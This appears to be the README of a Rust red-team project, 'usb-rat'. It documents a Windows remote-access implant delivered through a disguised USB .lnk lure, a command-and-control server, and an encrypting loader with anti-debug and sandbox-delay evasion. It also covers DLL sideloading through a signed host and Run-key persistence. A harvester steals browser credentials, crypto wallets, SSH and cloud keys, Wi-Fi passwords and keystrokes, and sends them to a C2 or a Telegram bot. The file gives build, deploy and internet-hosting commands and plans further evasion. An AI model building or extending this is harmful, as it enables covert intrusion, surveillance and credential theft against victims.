# usb-rat — USB drop → Windows C2 (screen view + remote control)

A self-contained red-team lab stack:

- **`implant/`** — Windows agent (Rust). Self-installs from a USB drop, persists,
  beacons over WebSocket, streams the desktop as JPEG, executes mouse/keyboard/shell.
- **`server/`** — C2 relay + operator web UI (Rust/axum, vanilla JS).
- **`stager/`** — PowerShell builder that turns a mounted USB into the lure.

> Authorized engagements and your own lab only.

---

## Research documentation

- [`docs/CRYPTER_ARCHITECTURE.md`](docs/CRYPTER_ARCHITECTURE.md) — full technical
  architecture, module descriptions, cryptographic design, key management,
  tamper detection, Windows compatibility matrix, benchmarks, security assessment.
- [`docs/TESTING.md`](docs/TESTING.md) — isolation policy, reproducible build,
  automated checks, measured results (hashes/entropy/strings/timing),
  AV/EDR experiment methodology with a FP/TP matrix.
- [`docs/EVASION.md`](docs/EVASION.md) — 2026 detection landscape (BYOVD, DLL
  sideloading, AMSI/ETW, syscalls) and the evasion playbook.

---

## Architecture

```
USB stick                         operator workstation
┌──────────────────────┐          ┌───────────────────────────┐
│ "Sənədlər.lnk" (icon)│  dbl-clk │  browser → /  (console)    │
│  └ .\_sys\winhost.exe│─────────▶│        │ /ws/op/{id}      │
└──────────────────────┘          │  c2-server (axum)          │
            │ runs                │        │ /ws/implant      │
            ▼                     └────────┼───────────────────┘
  %APPDATA%\Microsoft\WindowsRuntime\winhost.exe  (Hidden+System)
  HKCU\...\Run\WindowsRuntimeHost = "...winhost.exe"
            │
            └── WebSocket beacon ──▶ screen frames (0x01 JPEG)
                                     ◀── mouse / key / cmd / set
```

Wire format is specified in [`PROTOCOL.md`](PROTOCOL.md). With `TG_TOKEN` the
implant skips this C2 entirely and talks to Telegram instead — see
[Telegram-only mode](#telegram-only-mode).

---

## Hard reality (read before you trust this)

1. **`autorun.inf` is dead on removable drives since Win7.** There is no
   "plug in and it runs." The realistic flash-drive vector is the `.lnk` lure
   in `stager/` — it requires the user to double-click. If you can choose the
   hardware, **HID/BadUSB (Rubber Ducky, Pico) is an order of magnitude more
   reliable** and needs zero user action.
2. **No "perfect AV bypass" exists.** Defender's cloud + behavioral stack will
   often flag an unsigned, self-copying, Run-key, beaconing EXE regardless of
   small tricks. A from-scratch agent is *worse* at surviving EDR than a mature
   framework. For real engagements, put **Havoc (Demon, has remote desktop)** or
   **Sliver** behind this stager/loader instead of this implant, and treat this
   repo as the delivery + reference implementation.
3. **This repo's Windows binary has not been executed here.** The server is
   compiled and integration-tested on Linux; the Windows modules are written
   against `windows` crate 0.58 but only statically reviewed. Build on a Windows
   VM and test against Defender before any engagement.

---

## Build

### Server (Linux/macOS)
```bash
cargo build -p c2-server --release
# binary: target/release/c2-server
```

### Implant (cross-compile to Windows)
This machine has no Windows std/mingw. On a box with **rustup** + mingw:
```bash
rustup target add x86_64-pc-windows-gnu
# Arch: sudo pacman -S mingw-w64-gcc
# Debian: sudo apt install gcc-mingw-w64-x86-64

# embed the C2 endpoint at compile time (default ws://127.0.0.1:8080/ws/implant):
C2_URL='wss://c2.example.com/ws/implant' \
  cargo build -p implant --release --target x86_64-pc-windows-gnu
# binary: target/x86_64-pc-windows-gnu/release/implant.exe
```
Or build natively on a Windows VM with the MSVC toolchain:
`cargo build -p implant --release` (simplest; also where you test it).

`C2_URL` must point at `/ws/implant`. Use `ws://` for a lab, `wss://` with a real
cert for anything crossing a network.

---

## Run

```bash
# server needs the web/ dir (static UI); defaults: BIND=0.0.0.0:8080, WEB_DIR=web
export C2_TOKEN='pick-a-long-random-token'     # optional; omit = no auth (lab)
BIND=0.0.0.0:8080 WEB_DIR=web target/release/c2-server
```
Open `http://<host>:8080/?token=<C2_TOKEN>`.
The implant connects, appears in the sessions rail, and the screen streams.

### USB stager
On the operator box with the USB mounted (e.g. `E:\`):
```powershell
powershell -ExecutionPolicy Bypass -File stager\build_stager.ps1 `
  -UsbPath E:\ -Payload .\target\x86_64-pc-windows-gnu\release\implant.exe `
  -LureName "Sənədlər"
```
Produces `E:\Sənədlər.lnk` (folder icon, minimized) and `E:\_sys\winhost.exe`
(Hidden+System). On double-click the implant installs to `%APPDATA%`, sets the
Run key, relaunches detached, and exits the USB copy.

---

## Deployment: where to point each piece

Four connection points — three are config, one is the browser.

| Piece | Setting | Where | Example |
|---|---|---|---|
| implant | `C2_URL` (**compile-time**) | env during `cargo build -p implant` | `wss://c2.example.com/ws/implant` |
| implant | `TG_TOKEN` (**compile-time**) | env during `cargo build -p implant` | bot token from @BotFather |
| implant | `TG_CHAT` (**compile-time**, optional) | env during `cargo build -p implant` | numeric chat id; first authorized chat if unset |
| implant | `TG_SECRET` (**compile-time**, optional) | env during `cargo build -p implant` | gates the first chat that may lock the bot |
| implant | `TG_AUTO` (**compile-time**, optional) | env during `cargo build -p implant` | `0` disables the startup harvest |
| server | `BIND` | server process env | `0.0.0.0:8080` |
| server | `WEB_DIR` | server process env | `web` / absolute path |
| server | `C2_TOKEN` | server process env | long random string |
| server | `LOOT_DIR` | server process env | `./loot` |
| stager | `-UsbPath -Payload -LureName` | `build_stager.ps1` args | `E:\` , `...\implant.exe` |
| operator | browser URL | address bar | `https://c2.example.com/?token=...` |

**Lab (same host / VM network):**
```bash
BIND=0.0.0.0:8080 WEB_DIR=web C2_TOKEN=demo target/release/c2-server
# implant build:
C2_URL='ws://192.168.1.50:8080/ws/implant' cargo build -p implant --release --target x86_64-pc-windows-gnu
# browser: http://192.168.1.50:8080/?token=demo
```
No TLS — only inside a lab VLAN / host-only network.

**Internet (real):** terminate TLS and put nginx in front so the implant uses `wss://` on 443:
```nginx
server {
  listen 443 ssl;
  server_name c2.example.com;
  ssl_certificate     /etc/letsencrypt/live/c2.example.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
  location /ws/ { proxy_pass http://127.0.0.1:8080; proxy_http_version 1.1;
                  proxy_set_header Upgrade $http_upgrade;
                  proxy_set_header Connection "upgrade"; proxy_read_timeout 3600s; }
  location /    { proxy_pass http://127.0.0.1:8080; }
}
```
- server: `BIND=127.0.0.1:8080` (only behind nginx), strong `C2_TOKEN`
- implant: `C2_URL=wss://c2.example.com/ws/implant`
- browser: `https://c2.example.com/?token=<strong>`
- DNS A/AAAA → VPS, firewall opens **443 only**

No public IP? Use a tunnel (Cloudflare Tunnel, Tailscale Funnel, ngrok) and point
`C2_URL` at the tunnel host.

**The endpoint is baked into the .exe.** Use a domain you control so you can
repoint the proxy/tunnel without rebuilding. For runtime config instead, append
the URL to the binary or read a sidecar file next to the exe (`c2.rs`, small change).

---

## Crypter / loader (AV evasion layer)

`crypter/` adds an encrypting loader. **Read [`RESEARCH.md`](RESEARCH.md)** — the
key finding is that reflectively loading a Rust/tokio payload is TLS-unsound, so
there are two strategies chosen at pack time:

| Strategy | Flag | How | When |
|---|---|---|---|
| **temp-exec** (default) | — | decrypt → delete-pending `%TEMP%` exe → OS loader runs it | reliable; TLS/SEH correct |
| **reflective** | `--reflective` | map PE in memory, no disk | TLS-free payloads only |

- `crypter/common` — XChaCha20-Poly1305 AEAD (encrypt/decrypt, unit-tested)
- `crypter/packer` — encrypts a PE with a fresh random key/nonce, writes
  `loader/src/payload.enc` + a generated `gen.rs`
- `crypter/loader` — anti-debug → 8 s sandbox delay → decrypt, then either
  temp-exec (default) or reflective map (headers, sections, DIR64 relocations,
  imports, `.pdata`/`RtlAddFunctionTable`, TLS callbacks, protections)

Build flow:
```bash
# 1. build the implant (Windows)
C2_URL='wss://c2.example.com/ws/implant' \
  cargo build -p implant --release --target x86_64-pc-windows-gnu
# 2. pack it into the loader (new key/nonce every run → different hash)
#    default = temp-exec; add --reflective only for TLS-free payloads
cargo run -p crypter-packer -- \
  target/x86_64-pc-windows-gnu/release/implant.exe crypter/loader/src
# optional machine-bound build (only decrypts on that MachineGuid)
# cargo run -p crypter-packer -- target/.../implant.exe crypter/loader/src --bind <MachineGuid>
# 3. build the loader
cargo build -p crypter-loader --release --target x86_64-pc-windows-gnu
# 4. point the USB stager at loader.exe (NOT implant.exe)
powershell -File stager\build_stager.ps1 -UsbPath E:\ -Payload ...\loader.exe
```

Reflective mode keeps the implant out of the file system. Temp-exec briefly
writes it to a delete-pending `%TEMP%` file and lets the OS loader run it; the
**loader** installs persistence and launches the payload with `--no-install`, so
the plaintext payload is never copied to `%APPDATA%`.

Limits (stated plainly):
- **Reflective loading is TLS-unsound for Rust/tokio** (see `RESEARCH.md` §1).
  Use the default temp-exec strategy for this implant; reflective only for
  TLS-free payloads. Either way, test on the target build.
- The loader's own IAT still imports `VirtualAlloc`/`LoadLibraryA`; API hashing
  and direct/indirect syscalls are the next step.
- Anti-analysis is minimal (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`,
  8 s delay). No VM/sandbox fingerprinting.
- **No crypter reliably defeats Defender cloud/behavioral + EDR.** Screen-read +
  input-injection behavior is itself a strong RAT signal; combine with a signed
  binary / mature C2, not with hope.

---

### Signed-host DLL sideload

`crypter/dll-loader` builds `wmpdui.dll` (`DllMain` + `Run`). For a signed host
that imports functions from `wmpdui.dll`, generate the forwarder list and
rebuild:

```powershell
powershell -ExecutionPolicy Bypass -File tools\gen_proxy_def.ps1 `
  -HostExe C:\Windows\System32\wmpdmc.exe -Out crypter\dll-loader\proxy.def
cargo build -p crypter-dll --release --target x86_64-pc-windows-gnu
```

Place the signed host, our `wmpdui.dll`, and the renamed original
`real_wmpdui.dll` in `%LOCALAPPDATA%\WMProcess`, then run
`tools/sideload.ps1 -Dll ... -UseWmpHost`.

---

## Harvester (`harvest.rs`, `keylog.rs`)

The agent also carries a data-collection layer. In the WebSocket build, open
**loot → harvest all** in the console; in the Telegram build, send `/harvest`
(or let the startup auto-run do it). Collectors stream each artifact as a `0x03`
loot frame (persisted under `$LOOT_DIR/<session>/`) or, in Telegram mode, upload
one ZIP with `sendDocument`. Keylogging is toggled with **keylog** in the console
or `/keylog on` in Telegram.

Collectors (all best-effort, missing paths are skipped):

| Collector | What it grabs |
|---|---|
| `browsers` | Chromium (Chrome/Edge/Brave/Vivaldi/Yandex/Opera): `Login Data`, `Cookies`, `Web Data`, `History` + SQLite WAL sidecars + `Local State` are copied **raw** through `cmd.exe` (the implant never opens the browser profile itself). The agent only DPAPI-unwraps the AES key into `<browser>__key.txt`. Decrypt offline with `tools/decrypt_chromium.py`. Firefox profiles are shipped raw (`logins.json`, `key4.db`, `cookies.sqlite`, …). |
| `wallets` | Electrum, Exodus, Ethereum keystore, Bitcoin/Litecoin/Dogecoin `wallet.dat`, Monero, Atomic, Ledger Live, and MetaMask/Phantom extension LevelDB. |
| `keys` | `.ssh`, `.aws`, `.azure`, `.docker`, `.gitconfig`, `.npmrc`, `.pypirc`, `.netrc`, `.kube`, gcloud, FileZilla, OpenVPN profiles, Windows Credential blobs, loose `pem/key/pfx/kdbx/ovpn/rdp` on the Desktop. |
| `documents` | Desktop/Documents/Downloads/OneDrive sweep for office docs, PDFs, CSVs, SQL, configs, scripts, `.env` (≤1 MiB each, ≤200 files). |
| `wifi` | `netsh wlan export profile key=clear` → one XML per saved network (includes the PSK). |
| `clipboard` | Current `CF_UNICODETEXT` contents. |
| `env` | Env vars, `whoami /all`, `ipconfig /all`, `tasklist`, local users/admins, AV products, installed software. |

Bounds: 8 MiB per file, 40 MiB per harvest run, and loot names are sanitized
server-side (no traversal). The Windows build needs the mingw toolchain (linker
+ `windres` for the loader icon); the implant no longer links SQLite or AES-GCM.
The Linux `cargo check` path is unaffected because every collector is
`#[cfg(windows)]`.

**Why raw browser exfil?** Defender's `PWS:MSIL/Polazert` behavior rule flags
in-process browser-DB parsing + AES-GCM decryption. The agent now copies the
raw DBs via a signed `cmd.exe`, unwraps only the DPAPI key, and leaves the
credential decryption to the operator:

```bash
pip install cryptography
python3 tools/decrypt_chromium.py loot.zip decrypted/
```

This removes the `rusqlite`/`aes-gcm` imports and the in-process credential
decryption behavior. It is a detection reduction, not a guarantee.

### Telegram-only mode

Set `TG_TOKEN` at build time and the agent does **not** open the WebSocket C2 at
all. `tg_c2.rs` long-polls `getUpdates` for operator commands; loot is zipped
and uploaded with `sendDocument`, screenshots go out with `sendPhoto`, and
keylog batches arrive as messages. The C2 server/UI are unused in this mode.

Secrets live in the workspace-root `.env` (gitignored, mode 600). Cargo does not
read `.env` itself, so `implant/build.rs` bridges it to compile-time env vars;
a real process environment variable overrides the file.

```bash
# .env
# TG_TOKEN=...
# TG_CHAT=123456789
# TG_SECRET=change-me

cargo build -p implant --release --target x86_64-pc-windows-gnu
```

Verify what was baked in without printing secrets:
`cargo run -p implant -- --print-config`.

Commands (send to the bot):

| Command | Effect |
|---|---|
| `/start` `/help` | lock the chat / list commands |
| `/info` | host, user, admin, screen size, local IP, PID |
| `/screen [quality] [scale]` | one JPEG screenshot |
| `/stream on\|off [secs]` | periodic screenshots (min 2 s) |
| `/shell <command>` | run `cmd.exe /C`; long output as `.txt` |
| `/harvest [collectors]` | collect + zip + upload (empty = all) |
| `/grab <path>[\|<path>]` | exfil specific files/dirs |
| `/keylog on\|off` | live keystroke capture (uploaded in batches) |
| `/keys` | dump captured keystrokes now |
| `/clip` | current clipboard |
| `/move <x> <y>` | move cursor (pixels) |
| `/click <x> <y> [left\|right\|middle]` | click |
| `/type <text>` | type text (Unicode `SendInput`) |
| `/key <vk> [down\|up]` | raw Windows virtual key |
| `/exit` | stop the agent |

- **Authorization:** `TG_CHAT` pins the operator chat. Without it the first chat
  that presents `TG_SECRET` (or, if no secret is set, the first chatter) is
  locked in; later messages from any other chat are ignored. Set a secret on a
  bot that is reachable by anyone.
- **Autonomous harvest:** with `TG_TOKEN` set, the agent waits ~20 s after
  launch, collects everything, and uploads it, retrying every 60 s (up to 12
  times) until the chat is known and the upload succeeds. `TG_AUTO=0` disables
  the startup run.
- No HTTP/TLS crate is linked: it shells out to the `curl.exe` and `tar.exe`
  that ship with Windows 10/11 (PowerShell `Compress-Archive` is the zip
  fallback). This keeps the binary small and avoids another rustls stack.
- The bot token is baked into the binary from the environment; it is **not**
  written into the source tree. Do not commit it.
- Telegram caps bot uploads at 50 MB; the harvester's 40 MB ceiling keeps the
  archive under that. A webhook on the bot must be removed (`deleteWebhook` is
  called at startup).
- If `TG_TOKEN` is unset, the agent uses the original WebSocket C2 + `/api/loot`
  path instead.

Known limits: Chrome/Edge 127+ use App-Bound Encryption (`v20` values), which a
user-context agent cannot decrypt without an ABE bypass — those entries are
skipped, not corrupted. Firefox `logins.json` is shipped raw (NSS key derivation
is out of scope). Harvest runs from `spawn_blocking`, so the screen stream keeps
flowing while collectors run.

---

## Opsec / evasion — what is here vs what is missing

Implemented:
- `#![cfg_attr(windows, windows_subsystem = "windows")]` → no console window flash.
- Copy-out + `Hidden`+`System` attributes; `HKCU\Run` persistence (no admin).
- Compile profile: `opt-level="z"`, `lto`, `strip` (small binary, fewer strings).
- ETW `ret` patch + AMSI clean-stub helpers (`evasion.rs`) — **not yet called**;
  they only matter if you add in-process script/injection.
- Configurable FPS/quality/scale to keep beacon volume low.

Missing / next (highest leverage first):
1. **Static imports.** `SendInput`, `BitBlt`, registry calls are in the IAT and
   are easy signals. Move hot APIs to runtime resolution (hash-based) so the
   import table is boring.
2. **Signed-binary / LOLBin delivery.** Load the agent from a signed host
   (`rundll32`, `mshta` is noisy, `werfault`/`dllhost` sideload) rather than the
   raw EXE, or sign with a valid cert in-scope.
3. **In-memory staging.** Download+execute shellcode reflectively so nothing but
   the tiny loader touches disk; the current design drops an EXE.
4. **C2 hardening.** Domain fronting / CDN, malleable URIs, jittered beacon with
   sleep obfuscation (encrypt image while sleeping), no fixed `ws` path.
5. **EDR behavior.** A process reading the screen + injecting input every second
   is a textbook RAT signature; add capture limits, idle gating, and avoid
   touching `%APPDATA%\Microsoft` (heavily monitored) — use a less obvious path.

These are documented, not hand-waved: items 1–3 are where the detection win is.

---

## Verified vs unverified

| Part | Status |
|---|---|
| `c2-server` build | ✅ compiled (`cargo build -p c2-server`) |
| HTTP auth + sessions + static UI | ✅ smoke-tested (401/200, HTML served) |
| WebSocket relay (implant↔op, both directions) | ✅ `cargo test -p c2-server` passes |
| `implant` wire logic (non-Windows) | ✅ `cargo check -p implant` clean |
| `implant` Windows capture/input/persistence | ⚠️ every Win32 signature checked against windows-0.58 source; still needs a Windows build + run |
| `implant` harvest/keylog (Windows) | ⚠️ DPAPI key unwrap + raw browser copy via `cmd` + clipboard/keylog; compiles for `x86_64-pc-windows-gnu`, needs a live Windows run |
| `implant` telegram/tg_c2 (Windows) | ⚠️ curl/tar/`SendInput` flow type-checked with a Linux shim; needs a Windows build + live bot run |
| server loot store + `/api/loot/*` | ✅ compiled; covered by `server/tests/loot.rs` |
| USB `.lnk` stager | ⚠️ logic only — validate on Win10/11 VM |

---

## Layout
```
usb-rat/
├── Cargo.toml              workspace
├── PROTOCOL.md             wire format (authoritative)
├── implant/                Windows agent
│   └── src/{main,c2,capture,input,persist,evasion,harvest,keylog,telegram,tg_c2}.rs
├── server/                 C2 relay + UI
│   ├── src/{main,state,handlers}.rs
│   ├── web/                operator console (index/style/app/vk/logo)
│   └── tests/{relay,stream,loot}.rs
└── stager/build_stager.ps1 USB lure builder
```

## License

GPL-3.0-or-later. See [LICENSE](LICENSE).
